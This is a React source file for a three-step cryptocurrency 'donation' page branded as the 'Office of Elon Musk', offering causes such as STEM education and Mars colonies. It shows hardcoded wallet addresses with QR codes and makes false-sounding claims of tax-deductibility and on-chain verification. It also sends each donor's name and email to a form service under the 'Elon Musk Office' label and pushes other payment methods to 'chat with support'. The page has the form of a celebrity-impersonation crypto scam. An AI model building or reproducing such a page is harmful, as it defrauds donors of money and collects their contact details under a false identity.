import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Check, Copy, Shield, Lock, Heart, Bitcoin, ArrowRight, MessageCircle, Sparkles, Loader2 } from "lucide-react";
import { SiBitcoin, SiEthereum, SiTether, SiDogecoin, SiSolana, SiXrp } from "react-icons/si";
import { useToast } from "@/hooks/use-toast";

const causes = [
  { id: "stem", label: "STEM Education", icon: "EDU", desc: "Robotics kits, scholarships, teacher training" },
  { id: "energy", label: "Renewable Energy", icon: "SOLAR", desc: "Solar research, battery innovation, grid resilience" },
  { id: "ai", label: "AI Safety", icon: "AI", desc: "Alignment research, safe AI development, policy" },
  { id: "mars", label: "Mars Colony", icon: "MARS", desc: "Interplanetary life support, Starship research" },
];

const presetAmounts = [50, 100, 250, 500, 1000, 5000];

type CryptoOption = {
  id: string;
  name: string;
  symbol: string;
  address: string;
  network: string;
  icon: any;
  color: string;
};

const CRYPTO_OPTIONS: CryptoOption[] = [
  { id: "BTC", name: "Bitcoin", symbol: "BTC", address: "bc1q5twe754lnzvqn5z9jpm3s8z48nqvfx9e5wevv9", network: "Bitcoin Mainnet", icon: SiBitcoin, color: "#F7931A" },
  { id: "ETH", name: "Ethereum", symbol: "ETH", address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)", icon: SiEthereum, color: "#627EEA" },
  { id: "USDT", name: "Tether", symbol: "USDT", address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)", icon: SiTether, color: "#26A17B" },
  { id: "USDC", name: "USD Coin", symbol: "USDC", address: "0x15b9a0676D02a499f8Ad86dC373AdEf3a0bcAFe6", network: "Ethereum (ERC-20)", icon: SiTether, color: "#2775CA" },
  { id: "SOL", name: "Solana", symbol: "SOL", address: "4DXaUMq5S5HgDmq1jHcLDkx6ru2EF9sadyzMWwSadWWe", network: "Solana Mainnet", icon: SiSolana, color: "#9945FF" },
  { id: "DOGE", name: "Dogecoin", symbol: "DOGE", address: "D9EcRA1L3KFhk7DA9QoVUnyQr4HqMCyi3Q", network: "Dogecoin Mainnet", icon: SiDogecoin, color: "#C3A000" },
  { id: "XRP", name: "XRP", symbol: "XRP", address: "rN7n3473SaZBCYYd9T5K6t2f1G4jK1L2M", network: "XRP Ledger", icon: SiXrp, color: "#23292F" },
];

const WEB3FORMS_ACCESS_KEY = "4a64f30a-50b9-4468-a2a5-f3da60d67b2c";

export default function DonationForm() {
  const [step, setStep] = useState(1);
  const [selectedCause, setSelectedCause] = useState("stem");
  const [selectedAmount, setSelectedAmount] = useState(100);
  const [customAmount, setCustomAmount] = useState("");
  const [selectedCrypto, setSelectedCrypto] = useState<CryptoOption | null>(null);
  const [firstName, setFirstName] = useState("");
  const [email, setEmail] = useState("");
  const [copied, setCopied] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [qrUrl, setQrUrl] = useState<string>("");

  const displayAmount = customAmount || String(selectedAmount);
  const activeCrypto = selectedCrypto ?? CRYPTO_OPTIONS[0];

  // Generate QR for the active address
  useEffect(() => {
    if (activeCrypto) {
      const url = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(activeCrypto.address)}&bgcolor=0a0a0a&color=ffffff&margin=1`;
      setQrUrl(url);
    }
  }, [activeCrypto]);

  const copyAddress = async (addr: string) => {
    try {
      await navigator.clipboard.writeText(addr);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {}
  };

  const sendNotification = async () => {
    try {
      await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          access_key: WEB3FORMS_ACCESS_KEY,
          subject: `[Donate] New crypto donation initiated — $${displayAmount} ${activeCrypto.symbol}`,
          from_name: "Elon Musk Office · Donate",
          name: firstName,
          email,
          message: `Donation initiated: $${displayAmount} USD\nCause: ${causes.find((c) => c.id === selectedCause)?.label}\nCrypto: ${activeCrypto.name} (${activeCrypto.symbol})\nNetwork: ${activeCrypto.network}\nAddress: ${activeCrypto.address}\nDonor: ${firstName} <${email}>`,
        }),
      });
    } catch {
      // fire-and-forget; user still sees the success state
    }
  };

  const handleFinalSubmit = async () => {
    setSubmitting(true);
    await sendNotification();
    setSubmitting(false);
    setSubmitted(true);
  };

  if (submitted) {
    return (
      <section className="min-h-screen bg-background flex items-center justify-center px-6">
        <div className="max-w-lg text-center space-y-8">
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ type: "spring", damping: 12 }}
            className="w-20 h-20 mx-auto rounded-full bg-foreground flex items-center justify-center"
          >
            <Check className="w-10 h-10 text-background" />
          </motion.div>
          <div>
            <p className="text-xs uppercase tracking-[0.2em] text-muted-foreground mb-3">Office of Elon Musk</p>
            <h2 className="text-3xl md:text-4xl font-medium tracking-tight text-foreground mb-4">
              Thank you, {firstName}.
            </h2>
            <p className="text-foreground/60 leading-relaxed">
              Your contribution of <span className="text-foreground">${displayAmount} USD</span> to{" "}
              <span className="text-foreground">{causes.find((c) => c.id === selectedCause)?.label}</span> is on its way.
              Once your transaction reaches the required confirmations on the {activeCrypto.network}, our team will email a receipt to{" "}
              <span className="text-foreground">{email}</span>.
            </p>
          </div>
          <div className="flex items-center justify-center gap-6 text-muted-foreground text-xs">
            <div className="flex items-center gap-2"><Shield className="w-3.5 h-3.5" /> Secure</div>
            <div className="flex items-center gap-2"><Lock className="w-3.5 h-3.5" /> On-chain</div>
            <div className="flex items-center gap-2"><Heart className="w-3.5 h-3.5" /> Tax-deductible</div>
          </div>
          <a
            href="/"
            className="inline-block text-xs uppercase tracking-[0.14em] border border-foreground px-8 py-3 text-foreground hover:bg-foreground hover:text-background transition-colors"
          >
            Return to home
          </a>
        </div>
      </section>
    );
  }

  return (
    <section className="min-h-screen bg-background px-6 py-16 md:py-24">
      <div className="max-w-2xl mx-auto">
        {/* Step indicator */}
        <div className="flex items-center justify-center gap-2 mb-14">
          {[1, 2, 3].map((s) => (
            <div key={s} className="flex items-center gap-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold transition-colors ${
                step >= s ? "bg-foreground text-background" : "border border-border text-muted-foreground"
              }`}>
                {step > s ? <Check className="w-4 h-4" /> : s}
              </div>
              <span className={`text-[10px] md:text-xs uppercase tracking-[0.14em] hidden sm:inline ${step >= s ? "text-foreground" : "text-muted-foreground"}`}>
                {s === 1 ? "Cause" : s === 2 ? "Details" : "Send"}
              </span>
              {s < 3 && <div className={`w-10 md:w-16 h-px ${step > s ? "bg-foreground/60" : "bg-border"}`} />}
            </div>
          ))}
        </div>

        <AnimatePresence mode="wait">
          {step === 1 && (
            <motion.div
              key="step-1"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-8"
            >
              <div className="text-center">
                <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground mb-3">Step 1 of 3</p>
                <h2 className="text-2xl md:text-3xl font-medium tracking-tight text-foreground">
                  Choose a cause
                </h2>
                <p className="mt-2 text-sm text-foreground/60">100% of your contribution funds the program you select.</p>
              </div>

              <div>
                <p className="text-xs uppercase tracking-[0.14em] text-muted-foreground mb-3">Select a fund</p>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {causes.map((c) => (
                    <button
                      key={c.id}
                      type="button"
                      onClick={() => setSelectedCause(c.id)}
                      className={`p-5 border text-left transition-all ${
                        selectedCause === c.id
                          ? "border-foreground bg-secondary"
                          : "border-border hover:border-foreground/40"
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <span className="text-[10px] text-muted-foreground font-mono w-10">{c.icon}</span>
                        <div>
                          <p className="text-sm font-medium text-foreground">{c.label}</p>
                          <p className="text-[11px] text-muted-foreground mt-0.5">{c.desc}</p>
                        </div>
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <p className="text-xs uppercase tracking-[0.14em] text-muted-foreground mb-3">Amount (USD)</p>
                <div className="grid grid-cols-3 gap-3">
                  {presetAmounts.map((amt) => (
                    <button
                      key={amt}
                      type="button"
                      onClick={() => { setSelectedAmount(amt); setCustomAmount(""); }}
                      className={`py-3 text-sm font-medium border transition-all ${
                        selectedAmount === amt && !customAmount
                          ? "border-foreground bg-foreground text-background"
                          : "border-border text-foreground/70 hover:border-foreground/40"
                      }`}
                    >
                      ${amt.toLocaleString()}
                    </button>
                  ))}
                </div>
                <div className="mt-3">
                  <input
                    type="number"
                    min={1}
                    value={customAmount}
                    onChange={(e) => { setCustomAmount(e.target.value); setSelectedAmount(0); }}
                    placeholder="Custom amount (USD)"
                    className="w-full py-3 px-4 bg-background border border-border text-foreground text-center text-lg placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
                  />
                </div>
              </div>

              <div className="border border-border p-5 flex items-center justify-between">
                <div>
                  <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-1">
                    {causes.find((c) => c.id === selectedCause)?.label}
                  </p>
                  <p className="text-2xl font-medium text-foreground">${displayAmount} USD</p>
                </div>
                <button
                  type="button"
                  onClick={() => setStep(2)}
                  className="flex items-center gap-2 px-6 py-3 bg-foreground text-background text-sm font-semibold hover:bg-foreground/90 transition-colors"
                >
                  Continue <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div
              key="step-2"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center">
                <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground mb-3">Step 2 of 3</p>
                <h2 className="text-2xl md:text-3xl font-medium tracking-tight text-foreground">
                  Your details
                </h2>
                <p className="mt-2 text-sm text-foreground/60">We need a name and email to send your tax receipt.</p>
              </div>

              <div className="border border-border p-4 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Heart className="w-4 h-4 text-muted-foreground" />
                  <div>
                    <p className="text-xs text-muted-foreground">{causes.find((c) => c.id === selectedCause)?.label}</p>
                    <p className="text-sm font-medium text-foreground">${displayAmount} USD</p>
                  </div>
                </div>
                <button type="button" onClick={() => setStep(1)} className="text-xs text-muted-foreground hover:text-foreground underline">
                  Edit
                </button>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground block mb-2">First Name</label>
                  <input
                    type="text"
                    required
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value)}
                    placeholder="Your first name"
                    className="w-full py-3 px-4 bg-background border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
                  />
                </div>
                <div>
                  <label className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground block mb-2">Email Address</label>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="you@example.com"
                    className="w-full py-3 px-4 bg-background border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-foreground"
                  />
                </div>
              </div>

              <div className="flex items-center justify-between gap-3">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="text-xs uppercase tracking-[0.14em] border border-border px-6 py-3 text-muted-foreground hover:text-foreground hover:border-foreground/40 transition-colors"
                >
                  Back
                </button>
                <button
                  type="button"
                  onClick={() => setStep(3)}
                  disabled={!firstName || !email}
                  className="flex items-center gap-2 px-6 py-3 bg-foreground text-background text-sm font-semibold hover:bg-foreground/90 transition-colors disabled:opacity-40"
                >
                  Continue to payment <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </motion.div>
          )}

          {step === 3 && (
            <motion.div
              key="step-3"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              <div className="text-center">
                <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground mb-3">Step 3 of 3</p>
                <h2 className="text-2xl md:text-3xl font-medium tracking-tight text-foreground">
                  Send cryptocurrency
                </h2>
                <p className="mt-2 text-sm text-foreground/60">Send the exact amount to the wallet below. The receipt is sent once the network confirms.</p>
              </div>

              {/* Crypto selector */}
              <div>
                <p className="text-xs uppercase tracking-[0.14em] text-muted-foreground mb-3">Choose cryptocurrency</p>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  {CRYPTO_OPTIONS.map((c) => {
                    const Icon = c.icon;
                    const active = (selectedCrypto ?? CRYPTO_OPTIONS[0]).id === c.id;
                    return (
                      <button
                        key={c.id}
                        type="button"
                        onClick={() => setSelectedCrypto(c)}
                        className={`p-3 border flex flex-col items-center gap-1.5 transition-all ${
                          active ? "border-foreground bg-secondary" : "border-border hover:border-foreground/40"
                        }`}
                      >
                        <Icon className="w-5 h-5" style={{ color: c.color }} />
                        <span className="text-xs font-medium text-foreground">{c.symbol}</span>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Wallet details */}
              <div className="border border-border p-6">
                <div className="flex flex-col sm:flex-row gap-6">
                  {qrUrl && (
                    <div className="flex-shrink-0 mx-auto sm:mx-0">
                      <img
                        src={qrUrl}
                        alt={`${activeCrypto.symbol} wallet QR code`}
                        className="w-40 h-40 border border-border"
                      />
                      <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground text-center mt-2">
                        Scan to send
                      </p>
                    </div>
                  )}

                  <div className="flex-1 min-w-0 space-y-4">
                    <div>
                      <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-1">Network</p>
                      <p className="text-sm font-medium text-foreground">{activeCrypto.network}</p>
                    </div>
                    <div>
                      <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-1">Wallet Address</p>
                      <div className="flex items-center gap-2 border border-border bg-background p-3">
                        <code className="text-[11px] font-mono text-foreground break-all flex-1 leading-relaxed">
                          {activeCrypto.address}
                        </code>
                        <button
                          type="button"
                          onClick={() => copyAddress(activeCrypto.address)}
                          className="flex-shrink-0 p-2 hover:bg-secondary"
                          title="Copy address"
                        >
                          {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>
                    <div>
                      <p className="text-[10px] uppercase tracking-[0.14em] text-muted-foreground mb-1">Send exactly</p>
                      <p className="text-lg font-medium text-foreground">${displayAmount} USD <span className="text-muted-foreground text-sm">(in {activeCrypto.symbol})</span></p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Security */}
              <div className="grid sm:grid-cols-3 gap-3 text-xs">
                <div className="flex items-center gap-2 text-muted-foreground"><Shield className="w-3.5 h-3.5" /> Verified on-chain</div>
                <div className="flex items-center gap-2 text-muted-foreground"><Lock className="w-3.5 h-3.5" /> Non-custodial</div>
                <div className="flex items-center gap-2 text-muted-foreground"><Bitcoin className="w-3.5 h-3.5" /> 1 confirmation</div>
              </div>

              {/* Crypto-only notice */}
              <div className="border border-amber-500/30 bg-amber-500/5 p-4">
                <p className="text-xs text-amber-700 dark:text-amber-400 flex items-start gap-2">
                  <Sparkles className="w-3.5 h-3.5 mt-0.5 flex-shrink-0" />
                  <span>
                    <strong>Cryptocurrency only.</strong> For any other payment method (bank transfer, PayPal, check, stock transfer, or major gift), please open a chat with our support team.
                  </span>
                </p>
              </div>

              <div className="flex items-center justify-between gap-3">
                <button
                  type="button"
                  onClick={() => setStep(2)}
                  className="text-xs uppercase tracking-[0.14em] border border-border px-6 py-3 text-muted-foreground hover:text-foreground hover:border-foreground/40 transition-colors"
                >
                  Back
                </button>
                <div className="flex items-center gap-3">
                  <a
                    href="/pay"
                    className="hidden sm:inline-flex items-center gap-2 text-xs uppercase tracking-[0.14em] border border-border px-4 py-2.5 text-foreground/80 hover:border-foreground/40 transition-colors"
                  >
                    <Sparkles className="w-3.5 h-3.5" />
                    Advanced payment
                  </a>
                  <a
                    href="#contact"
                    className="hidden sm:inline-flex items-center gap-2 text-xs uppercase tracking-[0.14em] text-muted-foreground hover:text-foreground transition-colors"
                  >
                    <MessageCircle className="w-3.5 h-3.5" />
                    Chat with support
                  </a>
                  <button
                    type="button"
                    onClick={handleFinalSubmit}
                    disabled={submitting}
                    className="flex items-center gap-2 px-6 py-3 bg-foreground text-background text-sm font-semibold hover:bg-foreground/90 transition-colors disabled:opacity-50"
                  >
                    {submitting ? <><Loader2 className="w-3.5 h-3.5 animate-spin" /> Sending</> : <>I've sent it <Check className="w-3.5 h-3.5" /></>}
                  </button>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </section>
  );
}
